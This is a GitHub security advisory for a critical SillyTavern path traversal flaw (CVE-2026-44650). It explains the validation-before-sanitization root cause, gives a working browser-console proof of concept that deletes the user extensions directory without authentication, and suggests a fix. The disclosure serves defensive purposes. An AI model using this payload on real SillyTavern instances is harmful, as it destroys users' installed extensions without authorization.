# [C] SillyTavern has a Path Traversal issue

## Summary
Severity: Critical
Advisory: GHSA-886q-f44j-h6wh
CVE: CVE-2026-44650
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-05-12
Source: https://github.com/advisories/GHSA-886q-f44j-h6wh
Type: github-advisory

## Affected
- npm: `sillytavern` — affected >=0 <1.18.0

## Details
## Summary

`POST /api/extensions/delete` endpoint accepts `extensionName: "."` which bypasses 
`sanitize-filename` validation, causing the entire user extensions directory to be 
recursively deleted. No authentication is required in the default configuration.

## Affected File

`src/endpoints/extensions.js` (last modified: commit `3ad9b05e2`)

## Root Cause

The validation check occurs **before** sanitization:

```javascript
// [1] "." is truthy — passes the check
if (!request.body.extensionName) {
    return response.status(400).send('Bad Request');
}

// [2] sanitize(".")  →  ""
const extensionPath = path.join(basePath, sanitize(extensionName));
// path.join("data\\default-user\\extensions", "")
// = "data\\default-user\\extensions"  ← basePath itself!

// [3] Deletes the entire extensions directory
await fs.promises.rm(extensionPath, { recursive: true });
```

`sanitize-filename` converts `"."` to `""` (documented behavior).  
`path.join(basePath, "")` returns `basePath` itself.  
Result: the entire `data\default-user\extensions\` directory is deleted.

## Proof of Concept

Tested on: Windows 10, SillyTavern v1.17.0, commit `004f1336e`  
Authentication: none (basicAuthMode: false, default configuration)

Run in browser console (F12) while SillyTavern is open:

```javascript
async function poc() {
    const { token } = await (await fetch('/csrf-token')).json();
    const headers = {
        'Content-Type': 'application/json',
        'X-CSRF-Token': token,
    };

    // Before: 1 extension installed
    const before = await (await fetch('/api/extensions/discover', { headers })).json();
    console.log('Before:', before.filter(e => e.type === 'local'));
    // [{ type: 'local', name: 'third-party/Extension-Notebook' }]

    // Attack
    const res = await fetch('/api/extensions/delete', {
        method: 'POST',
        headers,
        body: JSON.stringify({ extensionName: '.' }),
    });
    console.log('Status:', res.status);      // 200
    console.log('Body:', await res.text());  // "Extension has been deleted at data\default-user\extensions"

    // After: empty
    const after = await (await fetch('/api/extensions/discover', { headers })).json();
    console.log('After:', after.filter(e => e.type === 'local'));
    // []
}
poc();
```

**Result:**
Before: [{ type: 'local', name: 'third-party/Extension-Notebook' }]
Status: 200
Body:   Extension has been deleted at data\default-user\extensions
After:  []

## Impact

- **No authentication required** (`basicAuthMode: false` by default).  
  Any user with network access to the SillyTavern instance can permanently 
  delete the entire extensions directory with a single HTTP request.
- All installed third-party extensions are unrecoverably lost.
- With `global: true` and admin privileges, the global extensions directory 
  shared across all users can also be deleted.
- This vulnerability can be chained with CVE-2025-59159 (DNS rebinding) to 
  enable unauthenticated remote exploitation from a malicious website.

## Same Pattern in Other Endpoints

The same vulnerability exists in:
- `POST /api/extensions/update`
- `POST /api/extensions/version`
- `POST /api/extensions/branches`
- `POST /api/extensions/switch`

## Suggested Fix

```javascript
const sanitized = sanitize(extensionName);

// Check AFTER sanitizing
if (!sanitized) {
    return response.status(400).send('Bad Request: Invalid extension name.');
}

const extensionPath = path.join(basePath, sanitized);

// Additional path traversal guard
const resolvedPath = path.resolve(extensionPath);
const resolvedBase = path.resolve(basePath);
if (!resolvedPath.startsWith(resolvedBase + path.sep)) {
    return response.status(400).send('Bad Request: Invalid extension path.');
}
```

Apply the same fix to `/update`, `/version`, `/branches`, and `/switch` endpoints.

## References

- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H (9.1 Critical)
- sanitize-filename npm: https://www.npmjs.com/package/sanitize-filename
- Related CVE (same project): CVE-2025-59159


##REPORTED BY
Jormungandr

## References
- https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-886q-f44j-h6wh
- https://github.com/SillyTavern/SillyTavern
- https://github.com/SillyTavern/SillyTavern/releases/tag/1.18.0
